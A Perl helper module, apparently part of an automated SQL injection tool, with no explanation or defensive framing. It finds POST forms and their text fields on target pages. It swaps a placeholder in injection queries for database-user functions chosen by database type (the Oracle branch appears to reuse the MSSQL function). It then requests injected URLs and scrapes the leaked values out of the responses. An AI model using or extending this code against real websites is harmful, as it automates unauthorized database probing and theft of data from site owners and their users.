#!/usr/bin/perl
use warnings;
use strict;
use threads;
use WWW::Mechanize;
use Thread::Queue;
use URI;
use HTML::Form;
use 5.010;

sub get_urls_sql_form
{
  my (@form_text_name,$form_action,$form_name,$form_method,@input_tags);
  my ($mech,$url,$keyword,%urls_sql_form)=@_;
	my $ua=eval{$mech->get($url)};
	my @forms=$mech->forms;
	for my $form(@forms)
  {	 
		$form_method=$form->method;		
		next unless $form_method eq "POST";
		next unless $form->action =~ /$keyword/;			
		$form_action=$form->action;
	  $form_name=$form->attr("name");
		next unless defined $form_name;
    
	  
		@input_tags=$form->inputs; #input태그의 정보
    #say "$form_name";
	  for my $input(@input_tags)
	  {
			next unless defined $input;			
		  my ($input_type,$input_name);
		  $input_type=$input->type;
		  next unless $input_type eq 'text';
		  $input_name=$input->name;
		  push @form_text_name,$input_name;
	  }
		
	my $value= join ' ',$form_action,$form_name,$form_method,@form_text_name;
  $urls_sql_form{$url}=$value;
  }
	return %urls_sql_form; 
}

sub if_dbname
{
		my ($url,$query);
		($url,$query)=@_;
		if($url eq 'MySQL')
		{
		  $query =~ s/'77777'/user\(\)/;
		  return $query;
		}
	  elsif($url eq 'Microsoft SQL')
		{
		  $query =~ s/'77777'/user_name\(\)/;
			return $query;
		}   
		elsif($url eq 'ORA')
		{
			$query =~ s/'77777'/user_name\(\)/;
			return $query;
		}
}

sub get_values
{
		my($mech,$url,$query,$content);
		my ($tag1,$tag2,$tag1_index,$tag2_index);
		my ($value_len,$value);

		($mech,$url,$query,$tag1,$tag2,$tag1_index)=@_;

		eval{$mech->get($url.$query)};
		$content=$mech->response->decoded_content;
		$content=~s/\s//g;

		$tag1_index=index($content,$tag1,$tag1_index-1);
		$tag2_index=index($content,$tag2,$tag1_index);
		$value_len=$tag2_index-$tag1_index-length($tag1);
		$value=substr($content,$tag1_index+length($tag1),$value_len);

		return $value;				
}
1;
